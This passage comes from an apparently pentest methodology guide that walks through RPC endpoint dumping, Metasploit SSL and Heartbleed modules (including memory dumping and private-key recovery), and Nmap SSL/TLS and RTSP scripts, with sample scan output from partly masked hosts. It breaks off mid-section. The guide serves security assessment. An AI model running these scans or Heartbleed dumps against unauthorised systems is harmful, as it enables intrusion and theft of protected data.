<h4>DCERPC TCP Service Auditor<a class="headerlink" href="#dcerpc-tcp-service-auditor" title="Link to this heading"></a></h4>
<p>Determine what DCERPC services are accessible over a TCP port.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor</span>
</pre></div>
</div>
</section>
</section>
<section id="id41">
<h3>Other<a class="headerlink" href="#id41" title="Link to this heading"></a></h3>
<p>We can use <strong>rpcdump</strong> from <strong>Impacket</strong> to dump the RPC information. This tool can communicate over Port 135, 139 and 445. The rpcdump tool from rpctools can also extract information from Port 593.</p>
<section id="rpcdump">
<h4>rpcdump<a class="headerlink" href="#rpcdump" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies</span>

<span class="go">usage: rpcdump.py [-h] [-debug] [-hashes LMHASH:NTHASH]</span>
<span class="go">                  target [{445/SMB,135/TCP,139/SMB}]</span>

<span class="go">Dumps the remote RPC endpoints information</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcdump.py 10.10.xx.xx</span>
<span class="go">Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies</span>

<span class="go">[*] Retrieving endpoint list from 10.10.xx.xx</span>
<span class="go">[*] Trying protocol 135/TCP...</span>
<span class="go">Protocol: N/A</span>
<span class="go">Provider: iphlpsvc.dll</span>
<span class="go">UUID    : 552D076A-CB29-4E44-8B6A-D15E59E2C0AF v1.0 IP Transition Configuration endpoint</span>
<span class="go">Bindings:</span>
<span class="go">          ncacn_np:\\ADS[\PIPE\srvsvc]</span>
<span class="go">          ncacn_ip_tcp:10.10.xx.xx[49154]</span>
<span class="go">          ncacn_np:\\ADS[\PIPE\atsvc]</span>
<span class="go">          ncalrpc:[senssvc]</span>
<span class="go">          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]</span>
<span class="go">          ncalrpc:[IUserProfile2]</span>

<span class="go">Protocol: N/A</span>
<span class="go">Provider: schedsvc.dll</span>
<span class="go">UUID    : 0A74EF1C-41A4-4E06-83AE-DC74FB1CDD53 v1.0</span>
<span class="go">Bindings:</span>
<span class="go">          ncalrpc:[senssvc]</span>
<span class="go">          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]</span>
<span class="go">          ncalrpc:[IUserProfile2]</span>

<span class="go">Protocol: N/A</span>
<span class="go">Provider: nsisvc.dll</span>
<span class="go">UUID    : 7EA70BCF-48AF-4F6A-8968-6A440754D5FA v1.0 NSI server endpoint</span>
<span class="go">Bindings:</span>
<span class="go">          ncalrpc:[LRPC-37912a0de47813b4b3]</span>
<span class="go">          ncalrpc:[OLE6ECE1F6A513142EC99562256F849]</span>

<span class="go">Protocol: [MS-CMPO]: MSDTC Connection Manager:</span>
<span class="go">Provider: msdtcprx.dll</span>
<span class="go">UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0</span>
<span class="go">Bindings:</span>
<span class="go">          ncalrpc:[LRPC-316e773cde064c1ede]</span>
<span class="go">          ncalrpc:[LRPC-316e773cde064c1ede]</span>
<span class="go">          ncalrpc:[LRPC-316e773cde064c1ede]</span>
<span class="go">          ncalrpc:[LRPC-316e773cde064c1ede]</span>

<span class="go">Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol</span>
<span class="go">Provider: spoolsv.exe</span>
<span class="go">UUID    : 0B6EDBFA-4A24-4FC6-8A23-942B1ECA65D1 v1.0 Spooler function endpoint</span>
<span class="go">Bindings:</span>
<span class="go">          ncalrpc:[spoolss]</span>

<span class="go">Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol</span>
<span class="go">Provider: taskcomp.dll</span>

<span class="go">Protocol: N/A</span>
<span class="go">Provider: MPSSVC.dll</span>
<span class="go">UUID    : 7F9D11BF-7FB9-436B-A812-B2D50C5D4C03 v1.0 Fw APIs</span>
<span class="go">Bindings:</span>
<span class="go">          ncalrpc:[LRPC-5409763072e46c4586]</span>

<span class="go">[*] Received 189 endpoints.</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-443-8443-https">
<span id="https-port-443-and-8443"></span><h2>Port 443/8443 - HTTPS<a class="headerlink" href="#port-443-8443-https" title="Link to this heading"></a></h2>
<section id="id42">
<h3>Metasploit<a class="headerlink" href="#id42" title="Link to this heading"></a></h3>
<p>Below modules which we found useful are</p>
<section id="http-ssl-certificate-information">
<h4>HTTP SSL Certificate Information<a class="headerlink" href="#http-ssl-certificate-information" title="Link to this heading"></a></h4>
<p>Parses the server SSL certificate to obtain the common name and signature algorithm.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/http/ssl</span>
<span class="go">services -p 443 -u -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.10.xx.xx:443 Subject: /OU=Domain Control Validated/CN=www.example.com</span>
<span class="go">[*] 10.10.xx.xx:443 Issuer: /C=US/ST=Arizona/L=Scottsdale/O=GoDaddy.com, Inc./OU=http://certs.godaddy.com/repository//CN=Go Daddy Secure Certificate Authority - G2</span>
<span class="go">[*] 10.10.xx.xx:443 Signature Alg: sha256WithRSAEncryption</span>
<span class="go">[*] 10.10.xx.xx:443 Public Key Size: 2048 bits</span>
<span class="go">[*] 10.10.xx.xx:443 Not Valid Before: 2016-01-12 10:01:38 UTC</span>
<span class="go">[*] 10.10.xx.xx:443 Not Valid After: 2017-02-26 09:13:38 UTC</span>
<span class="go">[+] 10.10.xx.xx:443 Certificate contains no CA Issuers extension... possible self signed certificate</span>
<span class="go">[*] 10.10.xx.xx:443 has common name www.example.com</span>
<span class="go">[*] Scanned 1 of 1 hosts (100% complete)</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
<p>and</p>
</section>
<section id="http-ssl-tls-version-detection-poodle-scanner">
<h4>HTTP SSL/TLS Version Detection (POODLE scanner)<a class="headerlink" href="#http-ssl-tls-version-detection-poodle-scanner" title="Link to this heading"></a></h4>
<p>If a web server can successfully establish an SSLv3 session, it is likely to be vulnerable to the POODLE attack.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/http/ssl_version</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.10.xx.xx:443 accepts SSLv3</span>
</pre></div>
</div>
</section>
<section id="openssl-server-side-changecipherspec-injection-scanner">
<h4>OpenSSL Server-Side ChangeCipherSpec Injection Scanner<a class="headerlink" href="#openssl-server-side-changecipherspec-injection-scanner" title="Link to this heading"></a></h4>
<p>Checks for the OpenSSL ChangeCipherSpec (CCS) Injection vulnerability. The problem exists in the handling of early CCS messages during session negotiation. There’s a NSE for the same ssl-ccs-injection.nse.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/ssl/openssl_ccs</span>
</pre></div>
</div>
</section>
<section id="openssl-heartbeat-heartbleed-information-leak">
<h4>OpenSSL Heartbeat (Heartbleed) Information Leak<a class="headerlink" href="#openssl-heartbeat-heartbleed-information-leak" title="Link to this heading"></a></h4>
<p>Module checks for the OpenSSL Heartbleed attack. The module supports several actions, allowing for scanning, dumping of memory contents, and private key recovery. It has three Actions: SCAN, KEYS, DUMP which scans the host for the vulnerability, scan for the private keys and dump the memory of the host.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/ssl/openssl_heartbleed</span>
</pre></div>
</div>
<p>SCAN Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.10.xx.xx:443 - Heartbeat response with leak</span>
</pre></div>
</div>
<p>DUMP Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.10.xx.xx:443 - Heartbeat response with leak</span>
<span class="go">[*] 10.10.xx.xx:443 - Heartbeat data stored in /root/.msf5/loot/20160403185025_default_10.10.235.69_openssl.heartble_299937.bin</span>

<span class="go">hexdump -C /root/.msf5/loot/20160403185025_default_10.10.xx.xx_openssl.heartble_299937.bin | more</span>
<span class="go">00000000  02 ff ff 94 03 01 57 00  0f a8 cf 31 3f 02 84 0b  |......W....1?...|</span>
<span class="go">00000010  59 9a d1 6b 3b 20 7b 7b  75 6b 17 2c 03 8d 8d 6a  |Y..k; \{\{uk.,...j|</span>
<span class="go">00000020  77 de b2 3a e3 28 00 00  66 c0 14 c0 0a c0 22 c0  |w..:.(..f.....&quot;.|</span>
<span class="go">00000030  21 00 39 00 38 00 88 00  87 00 87 c0 0f 00 35 00  |!.9.8.........5.|</span>
<span class="go">00000040  84 c0 12 c0 08 c0 1c c0  1b 00 16 00 13 c0 0d c0  |................|</span>
<span class="go">00000050  03 00 0a c0 13 c0 09 c0  1f c0 1e 00 33 00 32 00  |............3.2.|</span>
<span class="go">00000060  9a 00 99 00 45 00 44 c0  0e c0 04 00 2f 00 96 00  |....E.D...../...|</span>
<span class="go">00000070  41 c0 11 c0 07 c0 0c c0  02 00 05 00 04 00 15 00  |A...............|</span>
<span class="go">00000080  12 00 09 00 14 00 11 00  08 00 06 00 03 00 ff 01  |................|</span>
<span class="go">00000090  00 00 05 00 0f 00 01 01  06 03 02 03 04 02 02 02  |................|</span>
<span class="go">000000a0  07 c0 0c c0 02 00 05 00  04 00 15 00 12 00 09 00  |................|</span>
<span class="go">000000b0  ff 02 01 00 00 85 00 00  00 12 00 10 00 00 0d 32  |...............1|</span>
<span class="go">000000c0  32 33 2e 33 30 2e 32 33  35 2e 36 36 00 0b 00 04  |10.10.xx.xx....|</span>
<span class="go">000000d0  03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19  |.......4.2......|</span>
<span class="go">000000e0  00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08  |................|</span>
<span class="go">000000f0  00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13  |................|</span>
<span class="go">00000100  00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00  |.............#..|</span>
<span class="go">00000110  00 0d 00 22 00 20 06 01  06 02 06 03 05 01 05 02  |...&quot;. ..........|</span>
<span class="go">00000120  05 03 04 01 04 02 04 03  03 01 03 02 03 03 02 01  |................|</span>
<span class="go">00000130  02 02 02 03 01 01 00 0f  00 01 01 00 00 00 00 00  |................|</span>
<span class="go">00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span>
</pre></div>
</div>
</section>
</section>
<section id="id43">
<h3>Nmap<a class="headerlink" href="#id43" title="Link to this heading"></a></h3>
<p>Nmap has around</p>
<section id="ssl-cert">
<h4>ssl-cert<a class="headerlink" href="#ssl-cert" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-cert.html">ssl-cert.nse</a> : Retrieves a server’s SSL certificate. The amount of information printed about the certificate depends on the verbosity level. With no extra verbosity, the script prints the validity period and the commonName, organizationName, stateOrProvinceName, and countryName of the subject.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -sV -sC -p 443 10.10.xx.xx -n -vv</span>
<span class="go">Nmap scan report for 10.10.xx.xx</span>
<span class="go">Host is up, received reset ttl 60 (0.011s latency).</span>
<span class="go">Scanned at 2016-04-03 18:58:50 IST for 57s</span>
<span class="go">PORT    STATE SERVICE  REASON         VERSION</span>
<span class="go">443/tcp open  ssl/http syn-ack ttl 53 Apache httpd</span>
<span class="go">| ssl-cert: Subject: commonName=astarouflex.flexfilm.com/organizationName=Uflex/countryName=in/localityName=Noida</span>
<span class="go">| Issuer: commonName=virstech WebAdmin CA/organizationName=virstech/countryName=in/emailAddress=g@gmail.com/localityName=dehli</span>
<span class="go">| Public Key type: rsa</span>
<span class="go">| Public Key bits: 1024</span>
<span class="go">| Signature Algorithm: sha1WithRSAEncryption</span>
<span class="go">| Not valid before: 2013-02-01T13:27:36</span>
<span class="go">| Not valid after:  2038-01-01T00:00:01</span>
<span class="go">| MD5:   c213 2536 95b4 0fbd 0784 5a68 f2c0 3979</span>
<span class="go">| SHA-1: 5f8d 5cf5 6f5c 8b23 dc49 83ec 6251 b050 3fda 997e</span>
<span class="go">| -----BEGIN CERTIFICATE-----</span>
<span class="go">| MIIDOTCCAqKgAwIBAgIJANqxAruC7sYGMA0GCSqGSIb3DQEBBQUAMGsxCzAJBgNV</span>
<span class="go">| BAYTAmluMQ4wDAYDVQQHEwVkZWhsaTERMA8GA1UEChMIdmlyc3RlY2gxHTAbBgNV</span>
<span class="go">| BAMTFHZpcnN0ZWNoIFdlYkFkbWluIENBMRowGAYJKoZIhvcNAQkBFgtnQGdtYWls</span>
<span class="go">| LmNvbTAeFw0xMzAyMDExMzI3MzZaFw0zODAxMDEwMDAwMDFaMFAxCzAJBgNVBAYT</span>
<span class="go">| AmluMQ4wDAYDVQQHEwVOb2lkYTEOMAwGA1UEChMFVWZsZXgxITAfBgNVBAMTGGFz</span>
<span class="go">| dGFyb3VmbGV4LmZsZXhmaWxtLmNvbTCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkC</span>
<span class="go">| gYEAl09PwQfNKGMaqzD7CYLMQOskqMcP6MXJcPuHBl8wFte4M4yDzRTGJwEjmv9u</span>
<span class="go">| mcvv2HShww0nMXS2XEosjy65I2NqRBBFQ/+DmXtdiuoiWBeMk0OhV94fgSwDnhB/</span>
<span class="go">| 83RYyzKGMfKwOb63ovp8D78ufysPxqL8O49o+1bFMQYCoW0CAwEAAaOB/zCB/DAd</span>
<span class="go">| BgNVHQ4EFgQUvgIR5fXbkeXtnlT4jjKuhnUHacgwgZ0GA1UdIwSBlTCBkoAUGIfJ</span>
<span class="go">| GJvPoIGIJDyq9tgpKxU3gJihb6RtMGsxCzAJBgNVBAYTAmluMQ4wDAYDVQQHEwVk</span>
<span class="go">| ZWhsaTERMA8GA1UEChMIdmlyc3RlY2gxHTAbBgNVBAMTFHZpcnN0ZWNoIFdlYkFk</span>
<span class="go">| bWluIENBMRowGAYJKoZIhvcNAQkBFgtnQGdtYWlsLmNvbYIJANqxAruC7sYCMCMG</span>
<span class="go">| A1UdEQQcMBqCGGFzdGFyb3VmbGV4LmZsZXhmaWxtLmNvbTAJBgNVHRMEAjAAMAsG</span>
<span class="go">| A1UdDwQEAwIF4DANBgkqhkiG9w0BAQUFAAOBgQAentiShYI/t/XkWZrMe2E98RMs</span>
<span class="go">| yoD+BgYGxe6Gwn+L3pbb8oM5bxxmkydwVENNVrOG+kp1imU75HYge4QtHldjFf0y</span>
<span class="go">| i0myyr1jZ2IcnidcaYm/LhOFIUUmuP5YwDRK6jpIuJvzjDRcDxL63E9r950/f4jn</span>
<span class="go">| DrGIgqEJr7O9HKO7Tw==</span>
<span class="go">|_-----END CERTIFICATE-----</span>
</pre></div>
</div>
</section>
<section id="ssl-dh-params">
<h4>ssl-dh-params<a class="headerlink" href="#ssl-dh-params" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-dh-params.html">ssl-dh-params</a> : Weak ephemeral Diffie-Hellman parameter detection for SSL/TLS services. This script simulates SSL/TLS handshakes using ciphersuites that have ephemeral Diffie-Hellman as the key exchange algorithm.</p>
<p>Diffie-Hellman MODP group parameters are extracted and analyzed for vulnerability to Logjam (CVE 2015-4000) and other weaknesses.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script=ssl-dh-params -p 443 10.10.xx.xx -n</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-03 19:08 IST</span>
<span class="go">Nmap scan report for 10.10.xx.xx</span>
<span class="go">Host is up (0.013s latency).</span>
<span class="go">PORT    STATE SERVICE</span>
<span class="go">443/tcp open  https</span>
<span class="go">| ssl-dh-params:</span>
<span class="go">|   VULNERABLE:</span>
<span class="go">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span>
<span class="go">|     State: VULNERABLE</span>
<span class="go">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups of</span>
<span class="go">|       insufficient strength, especially those using one of a few commonly shared</span>
<span class="go">|       groups, may be susceptible to passive eavesdropping attacks.</span>
<span class="go">|     Check results:</span>
<span class="go">|       WEAK DH GROUP 1</span>
<span class="go">|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384</span>
<span class="go">|             Modulus Type: Safe prime</span>
<span class="go">|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus</span>
<span class="go">|             Modulus Length: 1024</span>
<span class="go">|             Generator Length: 8</span>
<span class="go">|             Public Key Length: 1024</span>
<span class="go">|     References:</span>
<span class="go">|_      https://weakdh.org</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 6.52 seconds</span>
</pre></div>
</div>
</section>
<section id="ssl-google-cert-catalog">
<h4>ssl-google-cert-catalog<a class="headerlink" href="#ssl-google-cert-catalog" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-google-cert-catalog.html">ssl-google-cert-catalog.nse</a> : Queries Google’s Certificate Catalog for the SSL certificates retrieved from target hosts.</p>
<p>The Certificate Catalog provides information about how recently and for how long Google has seen the given certificate. If a certificate doesn’t appear in the database, despite being correctly signed by a well-known CA and having a matching domain name, it may be suspicious.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 443 --script ssl-google-cert-catalog 223.30.xx.xx -n</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-03 19:14 IST</span>
<span class="go">Nmap scan report for 223.30.xx.xx</span>
<span class="go">Host is up (0.028s latency).</span>
<span class="go">PORT    STATE SERVICE</span>
<span class="go">443/tcp open  https</span>
<span class="go">| ssl-google-cert-catalog:</span>
<span class="go">|_  No DB entry</span>
</pre></div>
</div>
</section>
<section id="sslv2">
<h4>sslv2<a class="headerlink" href="#sslv2" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/sslv2.html">sslv2.nse</a> : Determines whether the server supports obsolete and less secure SSLv2, and discovers which ciphers it supports.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 443 --script sslv2 115.124.xx.xx -n</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-03 19:24 IST</span>
<span class="go">Nmap scan report for 115.124.xx.xx</span>
<span class="go">Host is up (0.0088s latency).</span>
<span class="go">PORT    STATE SERVICE</span>
<span class="go">443/tcp open  https</span>
<span class="go">| sslv2:</span>
<span class="go">|   SSLv2 supported</span>
<span class="go">|   ciphers:</span>
<span class="go">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span>
<span class="go">|     SSL2_RC2_CBC_128_CBC_WITH_MD5</span>
<span class="go">|     SSL2_RC4_128_WITH_MD5</span>
<span class="go">|     SSL2_RC4_64_WITH_MD5</span>
<span class="go">|     SSL2_DES_64_CBC_WITH_MD5</span>
<span class="go">|     SSL2_RC2_CBC_128_CBC_WITH_MD5</span>
<span class="go">|_    SSL2_RC4_128_EXPORT40_WITH_MD5</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds</span>
</pre></div>
</div>
</section>
<section id="ssl-ccs-injection">
<h4>ssl-ccs-injection<a class="headerlink" href="#ssl-ccs-injection" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html">ssl-ccs-injection.nse</a> : Detects whether a server is vulnerable to the SSL/TLS “CCS Injection” vulnerability (CVE-2014-0224). There’s a metasploit module for the same: openssl_ccs</p>
</section>
<section id="ssl-date">
<h4>ssl-date<a class="headerlink" href="#ssl-date" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-date.html">ssl-date.nse</a> : Retrieves a target host’s time and date from its TLS ServerHello response.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 443 --script ssl-date 115.124.xx.xx -n</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-03 19:29 IST</span>
<span class="go">Nmap scan report for 115.124.xx.xx</span>
<span class="go">Host is up (0.017s latency).</span>
<span class="go">PORT    STATE SERVICE</span>
<span class="go">443/tcp open  https</span>
<span class="go">|_ssl-date: 2016-04-03T18:49:19+00:00; +4h49m42s from scanner time.</span>
</pre></div>
</div>
</section>
<section id="ssl-enum-ciphers">
<h4>ssl-enum-ciphers<a class="headerlink" href="#ssl-enum-ciphers" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-enum-ciphers.html">ssl-enum-ciphers.nse</a> : Script repeatedly initiates SSLv3/TLS connections, each time trying a new cipher or compressor while recording whether a host accepts or rejects it. The end result is a list of all the ciphersuites and compressors that a server accepts.</p>
<p>Each ciphersuite is shown with a letter grade (A through F) indicating the strength of the connection. The grade is based on the cryptographic strength of the key exchange and of the stream cipher.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 443 --script ssl-enum-ciphers 115.124.xx.xx -n</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-03 19:33 IST</span>
<span class="go">Nmap scan report for 115.124.xx.xx</span>
<span class="go">Host is up (0.0085s latency).</span>
<span class="go">PORT    STATE SERVICE</span>
<span class="go">443/tcp open  https</span>
<span class="go">| ssl-enum-ciphers:</span>
<span class="go">|   SSLv3:</span>
<span class="go">|     ciphers:</span>
<span class="go">|       TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA - E</span>
<span class="go">|       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F</span>
<span class="go">|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 1024) - F</span>
<span class="go">|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 1024) - F</span>
<span class="go">|       TLS_DHE_RSA_WITH_DES_CBC_SHA (dh 1024) - F</span>
<span class="go">|       TLS_RSA_EXPORT_WITH_DES40_CBC_SHA - E</span>
<span class="go">|       TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 - E</span>
<span class="go">|       TLS_RSA_EXPORT_WITH_RC4_40_MD5 - E</span>
<span class="go">|       TLS_RSA_WITH_3DES_EDE_CBC_SHA - F</span>
<span class="go">|       TLS_RSA_WITH_AES_128_CBC_SHA - F</span>
<span class="go">|       TLS_RSA_WITH_AES_256_CBC_SHA - F</span>
<span class="go">|       TLS_RSA_WITH_DES_CBC_SHA - F</span>
<span class="go">|       TLS_RSA_WITH_RC4_128_MD5 - F</span>
<span class="go">|       TLS_RSA_WITH_RC4_128_SHA - F</span>
<span class="go">|     compressors:</span>
<span class="go">|       NULL</span>
<span class="go">|     cipher preference: client</span>
<span class="go">|     warnings:</span>
<span class="go">|       CBC-mode cipher in SSLv3 (CVE-2014-3566)</span>
<span class="go">|       Ciphersuite uses MD5 for message integrity</span>
<span class="go">|       Insecure certificate signature: MD5</span>
<span class="go">|   TLSv1.0:</span>
<span class="go">|     ciphers:</span>
<span class="go">|       TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA - E</span>
<span class="go">|       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F</span>
<span class="go">|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 1024) - F</span>
<span class="go">|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 1024) - F</span>
<span class="go">|       TLS_DHE_RSA_WITH_DES_CBC_SHA (dh 1024) - F</span>
<span class="go">|       TLS_RSA_EXPORT_WITH_DES40_CBC_SHA - E</span>
<span class="go">|       TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 - E</span>
<span class="go">|       TLS_RSA_EXPORT_WITH_RC4_40_MD5 - E</span>
<span class="go">|       TLS_RSA_WITH_3DES_EDE_CBC_SHA - F</span>
<span class="go">|       TLS_RSA_WITH_AES_128_CBC_SHA - F</span>
<span class="go">|       TLS_RSA_WITH_AES_256_CBC_SHA - F</span>
<span class="go">|       TLS_RSA_WITH_DES_CBC_SHA - F</span>
<span class="go">|       TLS_RSA_WITH_RC4_128_MD5 - F</span>
<span class="go">|       TLS_RSA_WITH_RC4_128_SHA - F</span>
<span class="go">|     compressors:</span>
<span class="go">|       NULL</span>
<span class="go">|     cipher preference: client</span>
<span class="go">|     warnings:</span>
<span class="go">|       Ciphersuite uses MD5 for message integrity</span>
<span class="go">|       Insecure certificate signature: MD5</span>
<span class="go">|_  least strength: F</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 1.81 seconds</span>
</pre></div>
</div>
</section>
<section id="ssl-heartbleed">
<h4>ssl-heartbleed<a class="headerlink" href="#ssl-heartbleed" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-heartbleed.html">ssl-heartbleed.nse</a> : Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 443 --script ssl-heartbleed 223.30.xx.xx -n</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-03 19:35 IST</span>
<span class="go">Nmap scan report for 223.30.xx.xx</span>
<span class="go">Host is up (0.011s latency).</span>
<span class="go">PORT    STATE SERVICE</span>
<span class="go">443/tcp open  https</span>
<span class="go">| ssl-heartbleed:</span>
<span class="go">|   VULNERABLE:</span>
<span class="go">|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</span>
<span class="go">|     State: VULNERABLE</span>
<span class="go">|     Risk factor: High</span>
<span class="go">|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.</span>
<span class="go">|</span>
<span class="go">|     References:</span>
<span class="go">|       http://cvedetails.com/cve/2014-0160/</span>
<span class="go">|       http://www.openssl.org/news/secadv_20140407.txt</span>
<span class="go">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds</span>
</pre></div>
</div>
</section>
<section id="ssl-poodle">
<h4>ssl-poodle<a class="headerlink" href="#ssl-poodle" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-poodle.html">ssl-poodle.nse</a> : Checks whether SSLv3 CBC ciphers are allowed (POODLE). POODLE is CVE-2014-3566</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 443 --script ssl-poodle 223.30.xx.xx -n</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-03 19:40 IST</span>
<span class="go">Nmap scan report for 223.30.xx.xx</span>
<span class="go">Host is up (0.011s latency).</span>
<span class="go">PORT    STATE SERVICE</span>
<span class="go">443/tcp open  https</span>
<span class="go">| ssl-poodle:</span>
<span class="go">|   VULNERABLE:</span>
<span class="go">|   SSL POODLE information leak</span>
<span class="go">|     State: VULNERABLE</span>
<span class="go">|     IDs:  CVE:CVE-2014-3566  OSVDB:113251</span>
<span class="go">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and</span>
<span class="go">|           other products, uses nondeterministic CBC padding, which makes it easier</span>
<span class="go">|           for man-in-the-middle attackers to obtain cleartext data via a</span>
<span class="go">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span>
<span class="go">|     Disclosure date: 2014-10-14</span>
<span class="go">|     Check results:</span>
<span class="go">|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA</span>
<span class="go">|     References:</span>
<span class="go">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span>
<span class="go">|       http://osvdb.org/113251</span>
<span class="go">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span>
<span class="go">|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-554-8554-rtsp">
<span id="rtsp-port-554-and-8554"></span><h2>Port 554/8554 - RTSP<a class="headerlink" href="#port-554-8554-rtsp" title="Link to this heading"></a></h2>
<section id="id45">
<h3>Nmap<a class="headerlink" href="#id45" title="Link to this heading"></a></h3>
<p>Two NSE for RTSP which are</p>
<section id="rtsp-methods">
<h4>rtsp-methods<a class="headerlink" href="#rtsp-methods" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/rtsp-methods.html">rtsp-methods.nse</a> : which determines which methods are supported by the RTSP (real time streaming protocol) server</p>
<p>RTSP-Methods Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 8554 --script rtsp-methods 10.10.xx.xx -sV</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-01 23:17 IST</span>
<span class="go">Nmap scan report for 10.10.xx.xx (10.10.22.195)</span>
<span class="go">Host is up (0.015s latency).</span>
<span class="go">PORT     STATE SERVICE VERSION</span>
<span class="go">8554/tcp open  rtsp    Geovision webcam rtspd</span>
